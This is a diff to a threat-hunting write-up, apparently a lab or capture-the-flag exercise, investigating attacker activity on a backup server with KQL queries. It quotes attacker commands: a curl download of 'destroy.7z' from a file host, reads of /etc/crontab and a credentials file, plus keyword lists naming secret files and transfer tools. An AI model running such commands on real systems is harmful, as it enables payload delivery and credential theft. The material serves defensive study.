@@ -324,13 +324,54 @@ DeviceProcessEvents
 
 ---
 <details>
-<summary id="-flag-x">🚩 <strong>Flag x: <Technique Name></strong></summary>
+<summary id="-flag-6">🚩 <strong>Flag 6: <Technique Name></strong></summary>
 
 ### 🎯 Objective
 <What the attacker was trying to accomplish>
 
 ### 📌 Finding
 <High-level description of the activity>
+
+### 🔍 Evidence
+
+| Field | Value |
+|------|-------|
+| Host | <Placeholder> |
+| Timestamp | 2025-11-24T14:16:08.673485Z |
+| Process | <Placeholder> |
+| Parent Process | <Placeholder> |
+| Command Line | <Placeholder> |
+
+### 💡 Why it matters
+<Explain impact, risk, and relevance>
+
+### 🔧 KQL Query Used
+DeviceProcessEvents
+| where DeviceName has "azuki-backupsrv"
+| where TimeGenerated between (datetime(2025-11-23) .. datetime(2025-11-27))
+| where ProcessCommandLine has_any ("passwd", "/etc/passwd", "getent", "id", "lslogins")
+| project DeviceName, AccountName, TimeGenerated, FileName, ProcessCommandLine, InitiatingProcessCommandLine
+
+### 🖼️ Screenshot
+<img width="772" height="167" alt="image" src="https://github.com/user-attachments/assets/6cfb3235-7ce0-41ed-9303-42e630defe81" />
+
+
+### 🛠️ Detection Recommendation
+
+**Hunting Tip:**  
+<Actionable guidance for defenders>
+
+</details>
+
+---
+<details>
+<summary id="-flag-7">🚩 <strong>Flag 7: <Technique Name></strong></summary>
+
+### 🎯 Objective
+<What the attacker was trying to accomplish>
+
+### 📌 Finding
+cat /etc/crontab
 
 ### 🔍 Evidence
 
@@ -346,10 +387,16 @@ DeviceProcessEvents
 <Explain impact, risk, and relevance>
 
 ### 🔧 KQL Query Used
-<Add KQL here>
+DeviceProcessEvents
+| where TimeGenerated between (datetime(2025-11-23) .. datetime(2025-11-27))
+| where DeviceName has "azuki-backupsrv"
+| where ProcessCommandLine has "/etc/crontab"
+| project TimeGenerated, ProcessCommandLine
+| order by TimeGenerated asc
 
 ### 🖼️ Screenshot
-<Insert screenshot>
+<img width="705" height="130" alt="image" src="https://github.com/user-attachments/assets/d8d9a79b-5020-4704-9aab-f9bfe838e8ae" />
+
 
 ### 🛠️ Detection Recommendation
 
@@ -360,13 +407,13 @@ DeviceProcessEvents
 
 ---
 <details>
-<summary id="-flag-x">🚩 <strong>Flag x: <Technique Name></strong></summary>
+<summary id="-flag-8">🚩 <strong>Flag x: <Technique Name></strong></summary>
 
 ### 🎯 Objective
 <What the attacker was trying to accomplish>
 
 ### 📌 Finding
-<High-level description of the activity>
+curl -L -o destroy.7z https://litter.catbox.moe/io523y.7z
 
 ### 🔍 Evidence
 
@@ -382,10 +429,16 @@ DeviceProcessEvents
 <Explain impact, risk, and relevance>
 
 ### 🔧 KQL Query Used
-<Add KQL here>
+DeviceProcessEvents
+| where TimeGenerated between (datetime(2025-11-23) .. datetime(2025-11-27))
+| where DeviceName has "azuki-backupsrv"
+| where ProcessCommandLine has_any ("wget ", "curl ", "scp ", "ftp ")
+| project TimeGenerated, ProcessCommandLine
+| order by TimeGenerated asc
 
 ### 🖼️ Screenshot
-<Insert screenshot>
+<img width="831" height="81" alt="image" src="https://github.com/user-attachments/assets/68d3c840-8130-4b5a-bea2-29ecc9c256a3" />
+
 
 ### 🛠️ Detection Recommendation
 
@@ -396,20 +449,20 @@ DeviceProcessEvents
 
 ---
 <details>
-<summary id="-flag-x">🚩 <strong>Flag x: <Technique Name></strong></summary>
+<summary id="-flag-9">🚩 <strong>Flag x: <Technique Name></strong></summary>
 
 ### 🎯 Objective
 <What the attacker was trying to accomplish>
 
 ### 📌 Finding
-<High-level description of the activity>
+cat /backups/configs/all-credentials.txt
 
 ### 🔍 Evidence
 
 | Field | Value |
 |------|-------|
-| Host | <Placeholder> |
-| Timestamp | <Placeholder> |
+| Host | azuki-backupsrv.zi5bvzlx0idetcyt0okhu05hda.cx.internal.cloudapp.net> |
+| Timestamp | 2025-11-24T14:14:14.217788Z |
 | Process | <Placeholder> |
 | Parent Process | <Placeholder> |
 | Command Line | <Placeholder> |
@@ -418,10 +471,16 @@ DeviceProcessEvents
 <Explain impact, risk, and relevance>
 
 ### 🔧 KQL Query Used
-<Add KQL here>
+DeviceProcessEvents
+| where TimeGenerated between (datetime(2025-11-23) .. datetime(2025-11-27))
+| where DeviceName has "azuki-backupsrv"
+| where ProcessCommandLine has_any ( "password"  "passwd", "credential", "credentials", "cred", "secret","secrets",  "token", "key", "keys",".key" , ".pem", ".pfx", ".pgpass", ".env",".conf", "/etc/passwd","/etc/shadow", "/etc/bacula",".ssh", "id_rsa", "authorized_keys")
+| project TimeGenerated, DeviceName, ProcessCommandLine
+| order by TimeGenerated asc
 
 ### 🖼️ Screenshot
-<Insert screenshot>
+<img width="653" height="100" alt="image" src="https://github.com/user-attachments/assets/03ac9d9a-7655-4355-a32e-96f999e55560" />
+
 
 ### 🛠️ Detection Recommendation
 
@@ -432,43 +491,7 @@ DeviceProcessEvents
 
 ---
 <details>
-<summary id="-flag-x">🚩 <strong>Flag x: <Technique Name></strong></summary>
-
-### 🎯 Objective
-<What the attacker was trying to accomplish>
-
-### 📌 Finding
-<High-level description of the activity>
-
-### 🔍 Evidence
-
-| Field | Value |
-|------|-------|
-| Host | <Placeholder> |
-| Timestamp | <Placeholder> |
-| Process | <Placeholder> |
-| Parent Process | <Placeholder> |
-| Command Line | <Placeholder> |
-
-### 💡 Why it matters
-<Explain impact, risk, and relevance>
-
-### 🔧 KQL Query Used
-<Add KQL here>
-
-### 🖼️ Screenshot
-<Insert screenshot>
-
-### 🛠️ Detection Recommendation
-
-**Hunting Tip:**  
-<Actionable guidance for defenders>
-
-</details>
-
----
-<details>
-<summary id="-flag-x">🚩 <strong>Flag x: <Technique Name></strong></summary>
+<summary id="-flag-10">🚩 <strong>Flag x: <Technique Name></strong></summary>
 
 ### 🎯 Objective
 <What the attacker was trying to accomplish>
